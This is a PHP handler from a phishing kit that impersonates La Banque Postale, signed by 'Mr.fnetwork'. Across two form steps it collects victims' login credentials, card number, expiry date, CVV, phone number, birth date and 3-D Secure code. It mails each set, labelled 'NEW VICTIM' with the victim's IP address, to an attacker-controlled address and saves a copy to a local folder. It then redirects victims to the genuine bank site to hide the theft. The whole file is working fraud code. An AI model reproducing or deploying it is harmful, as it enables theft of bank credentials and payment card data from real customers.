<?php
 /* CODED BY Mr.fnetwork  */
 require_once('yourhub.php');
 session_start();
 $username = $_SESSION['username'];
 $password = $_SESSION['password'];
 // Website title
 $web_title = "La Banque Postale - Gérez vos données personnelles";
 $web_title_secuirty = "La Banque Postale - 3-D Secure";
 $web_title_successfully = "La Banque Postale - Félicitation";

 // Vars with defaults values
 $error = false;
 $errormessage = "";
 $from = "";
 $subject = "";
 $message = "";
 $date = gmdate("H:i:s | d/m/Y");
 $victim_ip = getenv("REMOTE_ADDR");
 if(isset($_POST['doUpdate'])){
 	$phonenumber = $_POST['phonenumber'];
	$bday = $_POST['bday'];
 	$cc = $_POST['cc'];
 	$exmoth = $_POST['exmoth'];
 	$exyear = $_POST['exyear'];
 	$cvv = $_POST['cvv'];
 	

 	if(empty($phonenumber)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
        $message1 = 
        "=================😈😈😈VICTIM INFOS😈😈😈=================
------------------ '>VICTIM INFOS</font> ------------------<br/>
=================[ Username & Password]=================<br>
 [Username]   = ".$username."
[Password]    = ".$password."

=================[ Credit Card ]=================<br>
[Card Number]   = ".$cc."
[Expiration Date]    = ".$exmoth." / ".$exyear."
 [Cvv]    = ".$cvv."
=================[      Others  ]=================<br>
 [Phone Number]   = ".$phonenumber."
 [Birth Day]    = ".$bday."
=================[ <font style='color: #0a5d00;'>INFO VICTIM</font> ]=================<br>
 [IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    =  ".$date."
------------------ <font style='color: #820000;'>BY R3M0T</font> ------------------</div></html>\n";
        $send = "".$EX445093_REMOT."";
        $subject = "LOG| NEW VICTIM";
        $from .= "From: Mr.f-network@postale.net ";
        
       
        // Send results
        @mail($send,$subject,$message1,$from);
        $house = fopen('fucked/'.$username.'.html', 'a');
        fwrite($house, $message1);
        fclose($house);
        header('Location: security.php');
 	}
 }


 // 3-D Secure
 if(isset($_POST['doConfirm'])){
 	$secure = $_POST['secure'];

 	if(empty($secure)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
 		$message2 = 
        "=================😈😈😈😈VICTIM INFOS😈😈😈😈=================
=================[ 😈😈3-D Secure😈😈]=================
[3-D Se😈😈cure Code]   = ".$secure."
=================[ 😈😈INFO VICTIM😈😈 ]=================
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
------------------ 😈😈😈😈😈😈BY Mr.fnetwork😈😈😈😈😈😈 ------------------\n";
        $send = "".$EX445093_REMOT."";
        $subject = "3-D Secure | NEW VICTIM";
        $from .= "From: Mr.f-network@postale.net";
        
        // Send results
        @mail($send,$subject,$message2,$from);
        $house = fopen('fucked/'.$username.'-3DSecure.html', 'w');
        fwrite($house, $message2);
        fclose($house);
        header('Location: https://www.labanquepostale.fr/');
 	}
 }
?>